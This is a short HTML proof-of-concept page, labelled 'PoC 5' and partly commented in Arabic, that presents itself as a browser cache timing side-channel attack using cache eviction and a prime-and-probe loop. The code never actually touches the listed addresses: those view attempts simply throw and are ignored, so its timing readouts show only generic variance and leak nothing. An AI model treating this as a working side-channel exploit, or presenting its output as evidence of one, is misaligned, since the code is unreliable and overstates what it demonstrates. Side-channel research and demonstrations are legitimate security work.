<!DOCTYPE html>
<html>
<body>
<h2>PoC 5: Cache Timing Side-Channel</h2>
<button onclick="runTimingAttack()">ابدأ هجوم التوقيت</button>
<div id="timing" style="font-family: monospace; white-space: pre;"></div>

<script>
function log(msg) {
    document.getElementById('timing').textContent += msg + '\n';
}

function runTimingAttack() {
    log('=== Cache Timing Attack ===\n');
    
    // Cache eviction: تفريغ الكاش
    function evictCache() {
        const arr = new Uint8Array(1024 * 1024 * 10); // 10MB
        for (let i = 0; i < arr.length; i += 4096) {
            arr[i] = i;
        }
        return arr;
    }
    
    // قياس دقيق للوقت
    function measure(fn) {
        const start = performance.now();
        fn();
        return performance.now() - start;
    }
    
    // محاولة الوصول إلى عناوين مختلفة
    const testAddrs = [
        0x100000000n, 0x200000000n, 0x300000000n,
        0x7ff000000000n, 0x7ff100000000n
    ];
    
    log('Testing access times to various addresses...\n');
    
    testAddrs.forEach(addr => {
        evictCache();
        
        const time = measure(() => {
            // محاولة إنشاء view على عنوان
            try {
                // هذا لن يعمل مباشرة، لكن نقيس وقت المحاولة
                const buf = new ArrayBuffer(1024);
                const view = new Uint8Array(buf, Number(addr & 0xFFFFn), 64);
            } catch(e) {}
        });
        
        log(`Address 0x${addr.toString(16)}: ${time.toFixed(3)}ms`);
    });
    
    // Prime & Probe attack
    log('\n=== Prime & Probe ===\n');
    
    const probeArray = new Uint8Array(4096);
    
    // Prime: ملء الكاش
    for (let i = 0; i < probeArray.length; i++) {
        probeArray[i] = i;
    }
    
    // Probe: قياس أوقات الوصول
    const timings = [];
    for (let i = 0; i < 256; i++) {
        evictCache();
        const time = measure(() => probeArray[i * 16]);
        timings.push(time);
    }
    
    // عرض النتائج
    const minTime = Math.min(...timings);
    const maxTime = Math.max(...timings);
    
    log(`Min time: ${minTime.toFixed(3)}ms`);
    log(`Max time: ${maxTime.toFixed(3)}ms`);
    log(`Variance: ${(maxTime - minTime).toFixed(3)}ms`);
    
    if (maxTime - minTime > 0.1) {
        log('⚠️ Significant timing variance detected!');
        log('This suggests cache effects are observable.');
    }
    
    log('\n=== انتهى PoC 5 ===');
}
</script>
</body>
</html>
